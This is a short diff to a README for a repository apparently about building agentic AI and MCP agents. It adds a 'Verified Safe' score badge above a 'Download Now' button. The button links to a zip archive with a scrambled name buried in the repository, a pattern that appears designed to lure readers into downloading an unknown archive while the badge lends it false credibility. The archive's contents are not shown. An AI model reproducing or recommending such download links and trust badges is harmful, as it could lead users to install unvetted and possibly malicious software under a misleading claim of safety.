@@ -1,5 +1,7 @@
 # 🤖 Build-Agentic-AI-and-Gen-AI-Agents-with-MCP - Build Intelligent AI Workflows Easily
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/jfgj-gom-build-agentic-ai-and-gen-ai-agents-with-mcp)
+
 [![Download Now](https://github.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/raw/refs/heads/main/greatness/Gen-Agentic-Agents-A-with-Build-MCP-and-1.2.zip%20Now-Release%20Page-blue)](https://github.com/Jfgj-gom/Build-Agentic-AI-and-Gen-AI-Agents-with-MCP/raw/refs/heads/main/greatness/Gen-Agentic-Agents-A-with-Build-MCP-and-1.2.zip)
 
 ## 🚀 Getting Started
